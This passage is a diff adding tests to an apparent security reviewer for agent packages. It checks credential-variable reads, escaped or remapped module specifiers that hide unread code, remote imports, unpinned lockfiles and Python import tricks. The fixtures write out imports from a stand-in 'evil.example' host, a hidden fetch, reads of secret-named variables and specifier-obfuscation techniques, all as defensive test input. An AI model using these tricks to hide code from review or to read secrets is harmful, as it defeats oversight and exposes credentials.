@@ -963,3 +963,1045 @@ test("SR-23 refuses an undeclared server in .mcp.json or plugin.json", () => {
     assert.equal(r.file, path);
   }
 });
+
+// Spec 0.3.0: tests from the planted bugs round 9 found the suite missing.
+
+// SR-09 and SR-22: JavaScript reads and specifiers (reopen 3, js slice)
+
+test("SR-09 refuses a credential-like variable read through process['env'] in either quotes, naming it and its line", () => {
+  const text = [
+    "const a = process['env'].ALPHA_TOKEN;",
+    'const b = process["env"]["BRAVO_SECRET"];',
+    "const { CHARLIE_API_KEY } = process['env'];",
+    'const d = process["env"]?.DELTA_PASSWORD;',
+    "",
+  ].join("\n");
+  const { answer } = review(withProgram(text));
+  assert.equal(answer?.result, "refused", JSON.stringify(answer?.refusals ?? answer?.result ?? null));
+  for (const [name, line] of [["ALPHA_TOKEN", 1], ["BRAVO_SECRET", 2], ["CHARLIE_API_KEY", 3], ["DELTA_PASSWORD", 4]]) {
+    const r = refusal(answer, "undeclared-reach", name);
+    assert.ok(r, `names ${name}`);
+    assert.equal(r.file, PROGRAM_PATH);
+    assert.equal(r.line, line, name);
+  }
+});
+
+test("SR-22 refuses a specifier whose legacy octal escape Node reads as two characters, though a file matches a one-character reading", () => {
+  const dir = "skills/read-tickets/scripts";
+  const p = basePackage();
+  p[`${dir}/load.cjs`] = 'require("./test\\5710.js");\nrequire("./a\\400.js");\nrequire("./b\\400.js");\n';
+  p[`${dir}/test${String.fromCharCode(0o571)}0.js`] = "module.exports = 1;\n";
+  p[`${dir}/test/10.js`] = 'fetch("https://hidden.example/");\n';
+  p[`${dir}/a${String.fromCharCode(0o400)}.js`] = "module.exports = 1;\n";
+  p[`${dir}/b 0.js`] = "module.exports = 1;\n";
+  const { answer } = review(p);
+  assert.equal(answer?.result, "refused");
+  for (const [specifier, line] of [["./test\\5710.js", 1], ["./a\\400.js", 2]]) {
+    const r = refusal(answer, "unread-code", specifier);
+    assert.ok(r, `names ${specifier}: ${JSON.stringify(answer.refusals)}`);
+    assert.equal(r.file, `${dir}/load.cjs`);
+    assert.equal(r.line, line, specifier);
+  }
+  assert.equal(refusal(answer, "unread-code", "./b\\400.js"), undefined, "./b\\400.js is ./b 0.js, which ships");
+});
+
+test("SR-22 refuses a specifier with an escape it cannot decode, named as written", () => {
+  const dir = "skills/read-tickets/scripts";
+  const p = basePackage();
+  p[`${dir}/load.cjs`] = 'const ok = require("./ok.js");\nconst a = require("./\\u{110000}.js");\n';
+  p[`${dir}/load.mjs`] = 'import "./ok.js";\nimport "./\\u{FFFFFFFF}.mjs";\n';
+  p[`${dir}/ok.js`] = "module.exports = 1;\n";
+  const { answer } = review(p);
+  assert.equal(answer?.result, "refused", JSON.stringify(answer?.refusals ?? answer?.result ?? null));
+  for (const [file, specifier] of [["load.cjs", "./\\u{110000}.js"], ["load.mjs", "./\\u{FFFFFFFF}.mjs"]]) {
+    const r = refusal(answer, "unread-code", specifier);
+    assert.ok(r, `names ${specifier} as written`);
+    assert.equal(r.file, `${dir}/${file}`);
+    assert.equal(r.line, 2, specifier);
+  }
+  assert.equal(refusal(answer, "unread-code", "./ok.js"), undefined, "./ok.js ships");
+  assert.deepEqual(rules(answer).filter((x) => x === "unreadable"), [], "the rest of each program is still read");
+});
+
+
+// Reopen 3, slice "rules": tests for spec 0.3.0.
+
+test("SR-22 passes a Python program that declares any name CPython reads as UTF-8 or ASCII", () => {
+  const names = [
+    "utf--8", "utf--8-sig", "cp65001", "u8", "utf", "utf8", "utf8_ucs2", "utf8_ucs4", "utf-8-unix", "utf_8_unix",
+    "ascii", "646", "ansi_x3.4_1986", "ansi_x3_4_1968", "ansi.x3.4.1968", "cp367", "csascii", "ibm367",
+    "iso646_us", "iso_646.irv_1991", "iso_ir_6", "us-ascii", "ascii-", "-ascii",
+  ];
+  const p = basePackage();
+  names.forEach((name, i) => { p[`skills/read-tickets/scripts/enc${i}.py`] = `# coding: ${name}\nimport os\n`; });
+  const { answer } = review(p);
+  assert.equal(answer?.result, "passed", JSON.stringify(answer?.refusals ?? null));
+});
+
+test("SR-22 refuses a PEP 263 declaration CPython does not read as UTF-8 or ASCII, at line 1, with a why", () => {
+  const p = basePackage();
+  p["skills/read-tickets/scripts/dash.py"] = "# coding: -\nimport os\n";
+  p["skills/read-tickets/scripts/latin.py"] = "# coding: latin-1\nimport os\n";
+  const { answer } = review(p);
+  assert.equal(answer?.result, "refused");
+  assert.deepEqual(rules(answer), ["unread-code", "unread-code"], JSON.stringify(answer.refusals));
+  for (const [file, system] of [["dash.py", "coding: -"], ["latin.py", "coding: latin-1"]]) {
+    const r = refusal(answer, "unread-code", system);
+    assert.ok(r, `refuses ${system}: ${JSON.stringify(answer.refusals)}`);
+    assert.equal(r.file, `skills/read-tickets/scripts/${file}`);
+    assert.equal(r.line, 1, system);
+    assert.ok(typeof r.why === "string" && r.why.trim(), `${system} says why`);
+  }
+});
+
+test("SR-14 refuses a dependency with no lockfile or sha256, a sha256 in another shape, an npm lockfile that is not JSON, or an unpinned npm-shrinkwrap.json", () => {
+  const SHRINK = "skills/read-tickets/npm-shrinkwrap.json";
+  const lock = (entries) => `${JSON.stringify({ name: "r", lockfileVersion: 3, packages: { "": { name: "r" }, ...entries } }, null, 2)}\n`;
+  const pinned = lock({ "node_modules/a": { version: "1.0.0", integrity: "sha512-AAAA" } });
+  const one = lock({ "node_modules/p0": { version: "1.0.0" } });
+  const second = lock({ "node_modules/p0": { version: "1.0.0", integrity: "sha512-AAAA" }, "node_modules/p1": { version: "1.0.0" } });
+  const h = sha256(pinned);
+  const cases = [
+    ["no lockfile", {}, { skill: "read-tickets" }, undefined],
+    ["no sha256", { [LOCK]: pinned }, { skill: "read-tickets", lockfile: LOCK }, LOCK],
+    ["sha256: inside the digest", { [LOCK]: pinned }, { skill: "read-tickets", lockfile: LOCK, sha256: `${h.slice(0, 4)}sha256:${h.slice(4)}` }, LOCK],
+    ["not JSON", { [LOCK]: "not json\n" }, { skill: "read-tickets", lockfile: LOCK, sha256: sha256("not json\n") }, LOCK],
+    ["one entry unpinned", { [SHRINK]: one }, { skill: "read-tickets", lockfile: SHRINK, sha256: sha256(one) }, SHRINK],
+    ["the second of two unpinned", { [SHRINK]: second }, { skill: "read-tickets", lockfile: SHRINK, sha256: sha256(second) }, SHRINK],
+  ];
+  for (const [label, files, entry, file] of cases) {
+    const p = basePackage();
+    Object.assign(p, files);
+    p["agent-runtime-requirements.json"].dependencies = [entry];
+    const { answer } = review(p);
+    assert.deepEqual(rules(answer), ["dependency-unpinned"], `${label}: ${JSON.stringify(answer?.refusals ?? null)}`);
+    const r = answer.refusals[0];
+    assert.equal(r.file, file, label);
+    assert.ok(typeof r.why === "string" && r.why.trim(), `${label} says why`);
+  }
+});
+
+test("SR-14 passes a version 1 npm lockfile and a sha256: prefix in uppercase hex, and not_checked names no npm lockfile", () => {
+  const base = review(basePackage()).answer?.statement?.not_checked;
+  assert.ok(Array.isArray(base) && base.length > 0);
+  const v1 = `${JSON.stringify({ name: "r", lockfileVersion: 1, dependencies: { a: { version: "1.0.0" } } }, null, 2)}\n`;
+  const pinned = `${JSON.stringify({ name: "r", lockfileVersion: 3, packages: { "": { name: "r" }, "node_modules/a": { version: "1.0.0", integrity: "sha512-AAAA" } } }, null, 2)}\n`;
+  const p = basePackage();
+  p[LOCK] = v1;
+  p["skills/v1./package-lock.json"] = pinned;
+  p["skills/s/npm-shrinkwrap.json"] = pinned;
+  p["agent-runtime-requirements.json"].dependencies = [
+    { skill: "read-tickets", lockfile: LOCK, sha256: sha256(v1) },
+    { skill: "v1.", lockfile: "skills/v1./package-lock.json", sha256: `sha256:${sha256(pinned).toUpperCase()}` },
+    { skill: "s", lockfile: "skills/s/npm-shrinkwrap.json", sha256: `sha256:${sha256(pinned)}` },
+  ];
+  const { answer } = review(p);
+  assert.equal(answer?.result, "passed", JSON.stringify(answer?.refusals ?? null));
+  assert.deepEqual(answer.statement.not_checked, base);
+});
+
+test("SR-22 refuses a # import that a * pattern, a condition or an array maps to unread code", () => {
+  const p = withProgram(['import a from "#t/a";', 'import f from "#f";', 'import g from "#g";', basePackage()[PROGRAM_PATH]].join("\n"));
+  p["package.json"] = {
+    name: "ticket-reader",
+    imports: {
+      "#t/*": "./skills/read-tickets/scripts/test/*.mjs",
+      "#f": { default: "./skills/read-tickets/scripts/test/f.mjs" },
+      "#g": ["./skills/read-tickets/scripts/test/g.mjs"],
+    },
+  };
+  const { answer } = review(p);
+  assert.equal(answer?.result, "refused");
+  for (const [specifier, line] of [["#t/a", 1], ["#f", 2], ["#g", 3]]) {
+    const r = refusal(answer, "unread-code", specifier);
+    assert.ok(r, `names ${specifier}: ${JSON.stringify(answer.refusals)}`);
+    assert.equal(r.file, PROGRAM_PATH);
+    assert.equal(r.line, line, specifier);
+  }
+});
+
+test("SR-22 passes a # import the package.json does not define, or one a pattern maps to a shipped file", () => {
+  const cases = [
+    [{ "#a": "./skills/read-tickets/scripts/shape.mjs" }, "#b"],
+    [undefined, "#x"],
+    [{ "#t/*": "./skills/read-tickets/scripts/test/*.mjs" }, "#xyz"],
+    [{ "#t/*.mjs": "./skills/read-tickets/scripts/test/*.mjs" }, "#t/a.js"],
+    [{ "#a*a": "./skills/read-tickets/scripts/test/x.mjs" }, "#a"],
+    [{ "#a*a": "./skills/read-tickets/scripts/test/x.mjs" }, "#aa"],
+    [{ "#a*b*c": "./skills/read-tickets/scripts/test/x.mjs" }, "#axxb"],
+    [{ "#t/*": "./skills/read-tickets/scripts/*.mjs" }, "#t/shape"],
+  ];
+  for (const [imports, specifier] of cases) {
+    const p = withProgram([`import x from "${specifier}";`, basePackage()[PROGRAM_PATH]].join("\n"));
+    p["package.json"] = imports === undefined ? { name: "ticket-reader" } : { name: "ticket-reader", imports };
+    p["skills/read-tickets/scripts/shape.mjs"] = "export default 1;\n";
+    const { answer } = review(p);
+    assert.equal(answer?.result, "passed", `${specifier} with ${JSON.stringify(imports)}: ${JSON.stringify(answer?.refusals ?? null)}`);
+  }
+});
+
+test("SR-22 passes a require of a folder's main, a .json or .node file, or the package root's index", () => {
+  const S = "skills/read-tickets/scripts";
+  const p = basePackage();
+  p[`${S}/load.cjs`] = ['const lib = require("./lib");', 'const data = require("./data");', 'const addon = require("./addon");', 'const root = require("../../..");', ""].join("\n");
+  p[`${S}/lib/package.json`] = { main: "./main.js" };
+  p[`${S}/lib/main.js`] = "module.exports = 1;\n";
+  p[`${S}/data.json`] = "{}\n";
+  p[`${S}/addon.node`] = "bin";
+  p["index.js"] = "module.exports = 1;\n";
+  const { answer } = review(p);
+  assert.equal(answer?.result, "passed", JSON.stringify(answer?.refusals ?? null));
+});
+
+test("SR-22 refuses a require that Node would resolve to an unread main, no ending, a test file or no folder", () => {
+  const S = "skills/read-tickets/scripts";
+  const J = "module.exports = 1;\n";
+  const specifiers = ["./lib1", "./lib2", "./lib3", "./lib4", "./lib5", "./x.test", "./lib6/", "."];
+  const p = basePackage();
+  p[`${S}/load.cjs`] = `${specifiers.map((s, i) => `const m${i} = require(${JSON.stringify(s)});`).join("\n")}\n`;
+  p[`${S}/lib1/package.json`] = { main: "./test/b.js" };
+  p[`${S}/lib1/index.js`] = J;
+  p[`${S}/lib2/package.json`] = { main: "../../../../../x.js" };
+  p[`${S}/lib2/index.js`] = J;
+  p[`${S}/lib3/package.json`] = { main: "../../../../../x.js" };
+  p[`${S}/lib4/index`] = J;
+  p[`${S}/lib5/package.json`] = { main: "./main." };
+  p[`${S}/lib5/main.js`] = J;
+  p[`${S}/x.test.js`] = J;
+  p[`${S}/x.test/index.js`] = J;
+  p[`${S}/lib6.js`] = J;
+  p["skills/read-tickets/scripts.js"] = J;
+  const { answer } = review(p);
+  assert.equal(answer?.result, "refused");
+  specifiers.forEach((specifier, i) => {
+    const r = refusal(answer, "unread-code", specifier);
+    assert.ok(r, `names ${specifier}: ${JSON.stringify(answer.refusals)}`);
+    assert.equal(r.file, `${S}/load.cjs`);
+    assert.equal(r.line, i + 1, specifier);
+  });
+});
+
+test("SR-18 names each program in a language it does not read, and an extensionless #! script, and nothing else", () => {
+  const base = review(basePackage()).answer?.statement?.not_checked;
+  assert.ok(Array.isArray(base) && base.length > 0);
+  const named = ["skills/x/run.sh", "skills/x/run.rb", "skills/x/run.go", "skills/x/run.rs", "skills/x/Run.java", "skills/x/run.php", "skills/x/a.sh", "bin/tool"];
+  const p = basePackage();
+  for (const f of named) p[f] = "echo hi\n";
+  p["bin/tool"] = "#!/bin/sh\necho hi\n";
+  p["bin/plain"] = "echo hi\n";
+  p["skills/x/notes.txt"] = "echo hi\n";
+  const { answer } = review(p);
+  assert.equal(answer?.result, "passed", JSON.stringify(answer?.refusals ?? null));
+  const nc = answer.statement.not_checked;
+  for (const line of base) assert.ok(nc.includes(line), `still names ${line}`);
+  const extra = nc.filter((line) => !base.includes(line));
+  assert.equal(extra.length, named.length, JSON.stringify(extra));
+  for (const f of named) assert.equal(extra.filter((line) => line.includes(f)).length, 1, `names ${f} once: ${JSON.stringify(extra)}`);
+  const body = lockfile(true);
+  const locked = review(withDependency(body, { skill: "read-tickets", lockfile: LOCK, sha256: sha256(body) })).answer;
+  assert.equal(locked?.result, "passed", JSON.stringify(locked?.refusals ?? null));
+  assert.deepEqual(locked.statement.not_checked, base, "a pinned npm lockfile is not named");
+});
+
+test("SR-15 gives every refusal a non-blank why, for every rule", () => {
+  const p = basePackage();
+  const D = p["agent-descriptor.json"];
+  const R = p["agent-runtime-requirements.json"];
+  D.systems[0].needs = "";
+  D.systems.push({ name: "extra-sys", access: "read", needs: "x" }, { name: "spender", access: "read", needs: "to spend" });
+  R.systems.push({ name: "spender", kind: "service", spends: { unit: "calls" } });
+  R.ceilings = [{ system: "other", per: "task" }, { system: "ticket-store", per: "task", enforced_by: "platform" }, { system: "nobody", per: "day", enforced_by: "runtime" }];
+  const loose = `${JSON.stringify({ lockfileVersion: 3, packages: { "": {}, "node_modules/p0": {} } })}\n`;
+  p["skills/read-tickets/package-lock.json"] = loose;
+  p["skills/b/package-lock.json"] = "not json\n";
+  p["skills/c/package-lock.json"] = loose;
+  R.dependencies = [
+    { skill: "a" },
+    { lockfile: "skills/missing/package-lock.json", sha256: "00" },
+    { lockfile: "skills/read-tickets/package-lock.json" },
+    { lockfile: "skills/c/package-lock.json", sha256: "ff".repeat(32) },
+    { lockfile: "skills/b/package-lock.json", sha256: sha256("not json\n") },
+    { lockfile: "skills/read-tickets/package-lock.json", sha256: sha256(loose) },
+  ];
+  p[PROGRAM_PATH] += 'const k = process.env.BILLING_API_KEY;\nimport u from "./test/u.mjs";\n';
+  p["skills/read-tickets/scripts/enc.py"] = "# coding: latin-1\nimport os\n";
+  p["references/notes.md"] = `id = ${FAKE.awsAccessKey()}\n`;
+  p["mcp.json"] = "{}\n";
+  p["plugin.json"] = { name: "ticket-reader", version: "0.1.0", mcpServers: { "undeclared-srv": { command: "x" } } };
+  const owner = { spend_limit: { ...LIMIT, per: "week" }, ceilings: [{ system: "ticket-store", per: "task", most: 1 }, { system: "other", per: "task", most: 1 }] };
+  const many = review(p, owner).answer;
+  assert.equal(many?.result, "refused");
+  assert.equal(rules(many).filter((x) => x === "dependency-unpinned").length, 6, "one refusal for each dependency");
+  assert.equal(rules(many).filter((x) => x === "ceiling-missing").length, 3, "one refusal for each ceiling-missing cause");
+  const answers = [
+    many,
+    run("this is not json").answer,
+    run(request(join(AGENT, "test", "no-such-package"))).answer,
+    review(basePackage(), { ceilings: [] }).answer,
+  ];
+  const seen = new Set();
+  for (const a of answers) {
+    assert.equal(a?.result, "refused");
+    for (const r of a.refusals) {
+      seen.add(r.rule);
+      assert.ok(typeof r.why === "string" && r.why.trim(), `a ${r.rule} refusal says why: ${JSON.stringify(r)}`);
+    }
+  }
+  assert.deepEqual([...seen].sort(), [
+    "bad-request", "ceiling-missing", "ceiling-unset", "credential-in-files", "dependency-unpinned", "no-reason",
+    "spend-limit", "systems-mismatch", "undeclared-reach", "unread-code", "unreadable",
+  ]);
+});
+
+test("SR-17 gives every accepted_knowingly entry a non-blank what and why", () => {
+  const p = spending([{ system: "ticket-store", per: "task", enforced_by: "runtime" }]);
+  p["agent-descriptor.json"].systems[0].access = "write";
+  p["agent-descriptor.json"].systems[0].leaves = true;
+  p[PROGRAM_PATH] = `import { execFile } from "node:child_process";\n${basePackage()[PROGRAM_PATH]}const home = process.env.HOME_DIR;\n`;
+  const { answer } = review(p, { spend_limit: { ...LIMIT }, ceilings: [{ system: "ticket-store", per: "task", most: 3 }] });
+  assert.equal(answer?.result, "passed", JSON.stringify(answer?.refusals ?? null));
+  const a = accepted(answer);
+  assert.equal(a.length, 5, JSON.stringify(a));
+  assert.equal(a.filter((e) => e.system === "ticket-store").length, 3, "access, leaves and the runtime ceiling");
+  assert.equal(a.filter((e) => e.file === PROGRAM_PATH).length, 2, "the process start and the variable");
+  for (const e of a) {
+    for (const k of ["what", "why"]) assert.ok(typeof e[k] === "string" && e[k].trim(), `${k} in ${JSON.stringify(e)}`);
+  }
+});
+
+test("SR-22 refuses the package's own name where its exports, as a string or as conditions, map it to unread code", () => {
+  for (const exports of ["./test/main.mjs", { import: "./test/main.mjs" }]) {
+    const p = withProgram(['import x from "ticket-reader";', basePackage()[PROGRAM_PATH]].join("\n"));
+    p["package.json"] = { name: "ticket-reader", exports };
+    const { answer } = review(p);
+    const r = refusal(answer, "unread-code", "ticket-reader");
+    assert.ok(r, `exports ${JSON.stringify(exports)}: ${JSON.stringify(answer?.refusals ?? null)}`);
+    assert.equal(r.file, PROGRAM_PATH);
+    assert.equal(r.line, 1);
+  }
+});
+
+test("SR-22 passes a self-reference its exports do not map to unread code, and a name that is not the package's own", () => {
+  const cases = [
+    [{ name: "ticket-reader", exports: null }, "ticket-reader"],
+    [{ name: "ticket-reader", exports: { ".": "./skills/read-tickets/scripts/shape.mjs" } }, "ticket-reader"],
+    [{ name: "ticket-reader", exports: { "./a": "./test/a.mjs" } }, "ticket-reader/b"],
+    [{ name: "ticket-reader", exports: { ".": "./test/main.mjs" } }, "left-pad"],
+    [{ name: "ab", exports: { "./c": "./test/c.mjs" } }, "zz/c"],
+  ];
+  for (const [pkg, specifier] of cases) {
+    const p = withProgram([`import x from "${specifier}";`, basePackage()[PROGRAM_PATH]].join("\n"));
+    p["package.json"] = pkg;
+    p["skills/read-tickets/scripts/shape.mjs"] = "export default 1;\n";
+    const { answer } = review(p);
+    assert.equal(answer?.result, "passed", `${specifier} with ${JSON.stringify(pkg)}: ${JSON.stringify(answer?.refusals ?? null)}`);
+  }
+});
+
+test("SR-08 refuses an http, https, ws or wss import once, as undeclared reach, with no unread-code beside it", () => {
+  const schemes = ["http", "https", "ws", "wss"];
+  const p = basePackage();
+  for (const s of schemes) p[`skills/read-tickets/scripts/${s}.mjs`] = `import x from "${s}://evil.example/x.mjs";\nexport default x;\n`;
+  const { answer } = review(p);
+  assert.equal(answer?.result, "refused");
+  const found = answer.refusals.map((r) => [r.rule, r.system, r.file, r.line]).sort();
+  assert.deepEqual(found, schemes.map((s) => ["undeclared-reach", "evil.example", `skills/read-tickets/scripts/${s}.mjs`, 1]).sort());
+});
+
+test("SR-22 refuses a data: or file: URL that only contains node:, and a drive-letter path", () => {
+  const specifiers = ["data:text/javascript,import 'node:fs'", "file:///tmp/node:x.mjs", "C:/x.mjs"];
+  const p = withProgram([...specifiers.map((s, i) => `import x${i} from ${JSON.stringify(s)};`), basePackage()[PROGRAM_PATH]].join("\n"));
+  const { answer } = review(p);
+  assert.equal(answer?.result, "refused");
+  specifiers.forEach((specifier, i) => {
+    const r = refusal(answer, "unread-code", specifier);
+    assert.ok(r, `names ${specifier}: ${JSON.stringify(answer.refusals)}`);
+    assert.equal(r.file, PROGRAM_PATH);
+    assert.equal(r.line, i + 1, specifier);
+  });
+});
+
+test("SR-22 passes a bare name with / or ./ inside, .bin/x, and a # import mapped to a dependency, to nothing or to a shipped file", () => {
+  const a = withProgram([
+    'import fp from "lodash/fp";',
+    'import fp2 from "lodash/./fp";',
+    'const bin = require(".bin/x");',
+    'import dep from "#dep";',
+    'import none from "#none";',
+    'import c from "#c";',
+    basePackage()[PROGRAM_PATH],
+  ].join("\n"));
+  a["package.json"] = { name: "ticket-reader", imports: { "#dep": "left-pad", "#none": {}, "#c": "./.config/c.mjs" } };
+  a[".config/c.mjs"] = "export default 1;\n";
+  const b = withProgram(['import x from "#x";', basePackage()[PROGRAM_PATH]].join("\n"));
+  b["skills/read-tickets/scripts/package.json"] = { imports: { "#x": "./shape.mjs" } };
+  b["skills/read-tickets/scripts/shape.mjs"] = "export default 1;\n";
+  for (const [label, p] of [["bare names and a root map", a], ["a map beside the program", b]]) {
+    const { answer } = review(p);
+    assert.equal(answer?.result, "passed", `${label}: ${JSON.stringify(answer?.refusals ?? null)}`);
+  }
+});
+
+test("SR-22 refuses a # import where no package.json lies at or above the program, and still answers", () => {
+  const p = withProgram(['import x from "#x";', basePackage()[PROGRAM_PATH]].join("\n"));
+  p["main.mjs"] = 'import y from "#y";\nexport default y;\n';
+  const { status, answer } = review(p);
+  assert.equal(status, 0);
+  assert.equal(answer?.result, "refused");
+  assert.deepEqual(rules(answer), ["unread-code", "unread-code"], JSON.stringify(answer.refusals));
+  for (const [specifier, file] of [["#x", PROGRAM_PATH], ["#y", "main.mjs"]]) {
+    const r = refusal(answer, "unread-code", specifier);
+    assert.ok(r, `names ${specifier}`);
+    assert.equal(r.file, file);
+    assert.equal(r.line, 1);
+  }
+});
+
+test("SR-22 passes a bare import in a package that ships no package.json, from a skill or from the package root", () => {
+  const p = withProgram(['import pad from "left-pad";', basePackage()[PROGRAM_PATH]].join("\n"));
+  p["main.mjs"] = 'import pad from "left-pad";\nexport default pad;\n';
+  const { status, answer } = review(p);
+  assert.equal(status, 0);
+  assert.equal(answer?.result, "passed", JSON.stringify(answer?.refusals ?? null));
+});
+
+test("SR-10 refuses each missing or malformed spending limit once, with a non-blank why", () => {
+  const owners = [{}, { ceilings: [] }, { spend_limit: null, ceilings: [] }, { spend_limit: { ...LIMIT, per: "week" }, ceilings: [] }];
+  for (const owner of owners) {
+    const { answer } = review(basePackage(), owner);
+    assert.deepEqual(rules(answer), ["spend-limit"], `${JSON.stringify(owner)}: ${JSON.stringify(answer?.refusals ?? null)}`);
+    const { why } = answer.refusals[0];
+    assert.ok(typeof why === "string" && why.trim(), `${JSON.stringify(owner)} says why`);
+  }
+});
+
+test("SR-17 accepts knowingly a system whose access is unstated, with a non-blank what and why", () => {
+  for (const access of [undefined, null]) {
+    const p = basePackage();
+    if (access === undefined) delete p["agent-descriptor.json"].systems[0].access;
+    else p["agent-descriptor.json"].systems[0].access = access;
+    const { answer } = review(p);
+    assert.equal(answer?.result, "passed", JSON.stringify(answer?.refusals ?? null));
+    const a = accepted(answer);
+    assert.equal(a.length, 1, `access ${access}: ${JSON.stringify(a)}`);
+    assert.equal(a[0].system, "ticket-store");
+    for (const k of ["what", "why"]) assert.ok(typeof a[0][k] === "string" && a[0][k].trim(), `${k} for access ${access}`);
+  }
+});
+
+test("SR-22 passes a percent-decoded import of a shipped file, an import Node rejects for an encoded slash, and a require with a backslash", () => {
+  const p = withProgram(['import { shape } from "./%73hape.mjs";', 'import x from "./a%2Fb.mjs";', basePackage()[PROGRAM_PATH]].join("\n"));
+  p["skills/read-tickets/scripts/shape.mjs"] = "export const shape = 1;\n";
+  p["skills/read-tickets/scripts/load.cjs"] = 'const s = require(".\\\\shape.mjs");\n';
+  const { answer } = review(p);
+  assert.equal(answer?.result, "passed", JSON.stringify(answer?.refusals ?? null));
+});
+
+test("SR-22 refuses an import whose query leaves a folder, and a require that reads ?x as part of its path", () => {
+  const S = "skills/read-tickets/scripts";
+  const p = withProgram(['import l from "./lib/?x";', basePackage()[PROGRAM_PATH]].join("\n"));
+  p[`${S}/lib.mjs`] = "export default 1;\n";
+  p[`${S}/lib.js`] = "module.exports = 1;\n";
+  p[`${S}/shape.mjs`] = "export const shape = 1;\n";
+  p[`${S}/load.cjs`] = 'const s = require("./shape.mjs?x");\n';
+  const { answer } = review(p);
+  assert.equal(answer?.result, "refused");
+  for (const [specifier, file] of [["./lib/?x", PROGRAM_PATH], ["./shape.mjs?x", `${S}/load.cjs`]]) {
+    const r = refusal(answer, "unread-code", specifier);
+    assert.ok(r, `names ${specifier}: ${JSON.stringify(answer.refusals)}`);
+    assert.equal(r.file, file);
+    assert.equal(r.line, 1);
+  }
+});
+
+test("SR-12 takes an owner number of 0 or 0.5, skips a null owner entry, and refuses -0.5, naming the system", () => {
+  const p = spending([{ system: "ticket-store", per: "task", enforced_by: "runtime" }]);
+  for (const [ceilings, most] of [[[{ system: "ticket-store", per: "task", most: 0 }], 0], [[{ system: "ticket-store", per: "task", most: 0.5 }], 0.5],
+    [[null, { system: "ticket-store", per: "task", most: 2 }], 2]]) {
+    const { answer } = review(p, { spend_limit: { ...LIMIT }, ceilings });
+    assert.equal(answer?.result, "passed", `${JSON.stringify(ceilings)}: ${JSON.stringify(answer?.refusals ?? null)}`);
+    assert.deepEqual(answer.statement.spends.ceilings, [{ system: "ticket-store", per: "task", most, enforced_by: "runtime" }]);
+  }
+  const { answer } = review(p, { spend_limit: { ...LIMIT }, ceilings: [{ system: "ticket-store", per: "task", most: -0.5 }] });
+  assert.deepEqual(rules(answer), ["ceiling-unset"], JSON.stringify(answer?.refusals ?? null));
+  assert.equal(answer.refusals[0].system, "ticket-store");
+});
+
+test("SR-16 passes a per-task limit, systems with no name, and a platform ceiling on a system with no credential, accepting none of them knowingly", () => {
+  const p = basePackage();
+  p["agent-descriptor.json"].systems.push(
+    { name: "text-reasoning", access: "read", needs: "to summarize the tickets" }, { access: "write", needs: "x", leaves: true }, null,
+  );
+  p["agent-runtime-requirements.json"].systems.push(
+    { name: "text-reasoning", kind: "mcp", spends: { unit: "tokens" } }, { kind: "service", spends: { unit: "calls" } }, null,
+  );
+  p["agent-runtime-requirements.json"].ceilings = [{ system: "text-reasoning", per: "task", enforced_by: "platform" }];
+  const limit = { ...LIMIT, per: "task" };
+  const { answer } = review(p, { spend_limit: limit, ceilings: [{ system: "text-reasoning", per: "task", most: 3 }] });
+  assert.equal(answer?.result, "passed", JSON.stringify(answer?.refusals ?? null));
+  assert.deepEqual(answer.statement.reaches.map((r) => r.system), ["ticket-store", "text-reasoning"]);
+  assert.deepEqual(answer.statement.spends, { limit, ceilings: [{ system: "text-reasoning", per: "task", most: 3, enforced_by: "platform" }] });
+  assert.deepEqual(accepted(answer), []);
+});
+
+test("SR-23 names mcp.json in its unreadable refusal when it carries no mcpServers", () => {
+  const { answer } = review({ ...basePackage(), "mcp.json": "{}\n" });
+  assert.deepEqual(rules(answer), ["unreadable"], JSON.stringify(answer?.refusals ?? null));
+  assert.equal(answer.refusals[0].file, "mcp.json");
+  assert.ok(typeof answer.refusals[0].why === "string" && answer.refusals[0].why.trim());
+});
+
+
+// Python imports, environment reads, process starts and URL forms (reopen 3, pyrest slice)
+
+test("SR-22 decodes each Python escape in an import_module literal as Python does, naming the module path it gives", () => {
+  const dir = "skills/read-tickets/scripts";
+  const bs = "\\";
+  const cases = [
+    ['"t\\x65sts"', "\n", "tests"],
+    ['"tests"', "\n", "tests"],
+    ['"t\\U00000065sts"', "\n", "tests"],
+    ['"t\\145sts"', "\n", "tests"],
+    ['"te\\\nsts"', "\n", "tests"],
+    ['"te\\\rsts"', "\n", "tests"],
+    ['"te\\\r\nsts"', "\r\n", "tests"],
+    ['"tests.a\\1"', "\n", "tests.a\u0001"],
+    [`"tests.${bs}${bs}${bs}'${bs}"${bs}a${bs}b${bs}f${bs}n${bs}r${bs}t${bs}v"`, "\n", "tests.\\'\"\x07\b\f\n\r\t\x0b"],
+  ];
+  const p = basePackage();
+  cases.forEach(([literal, eol], i) => { p[`${dir}/load${i}.py`] = `import importlib${eol}importlib.import_module(${literal})${eol}`; });
+  const { answer } = review(p);
+  assert.equal(answer?.result, "refused");
+  assert.deepEqual([...new Set(rules(answer))], ["unread-code"], JSON.stringify(answer.refusals));
+  cases.forEach(([literal, , system], i) => {
+    const found = answer.refusals.filter((r) => r.file === `${dir}/load${i}.py`).map((r) => [r.system, r.line]);
+    assert.deepEqual(found, [[system, 2]], literal);
+  });
+});
+
+test("SR-22 passes an import_module call with no argument, a computed name or a bytes literal, and a print of a test name", () => {
+  const dir = "skills/read-tickets/scripts";
+  const calls = [
+    "importlib.import_module()",
+    "importlib.import_module(name)",
+    'importlib.import_module("tests." + name)',
+    'importlib.import_module(b"tests")',
+    'importlib.import_module(b"a.tests.b")',
+    'print("tests")',
+  ];
+  const p = basePackage();
+  calls.forEach((call, i) => { p[`${dir}/load${i}.py`] = `import importlib\nname = "x"\n${call}\n`; });
+  const { answer } = review(p);
+  assert.equal(answer?.result, "passed", JSON.stringify(answer?.refusals ?? null));
+  assert.deepEqual(answer.statement.accepted_knowingly, []);
+  assert.ok(answer.statement.not_checked.some((line) => /computed at runtime/i.test(line) && /module path/i.test(line)));
+});
+
+test("SR-22 refuses an import_module literal in parentheses, in adjacent parts, beside a package, or as an f-string with no field", () => {
+  const dir = "skills/read-tickets/scripts";
+  const calls = [
+    ['importlib.import_module(("tests"))', "tests"],
+    ['importlib.import_module("tests" "." "x")', "tests.x"],
+    ['importlib.import_module("tests", name)', "tests"],
+    ['importlib.import_module(f"tests")', "tests"],
+    ['importlib.import_module(f"tests.{{x}}")', "tests.{x}"],
+  ];
+  const p = basePackage();
+  calls.forEach(([call], i) => { p[`${dir}/load${i}.py`] = `import importlib\nname = "x"\n${call}\n`; });
+  const { answer } = review(p);
+  assert.equal(answer?.result, "refused");
+  assert.deepEqual([...new Set(rules(answer))], ["unread-code"], JSON.stringify(answer.refusals));
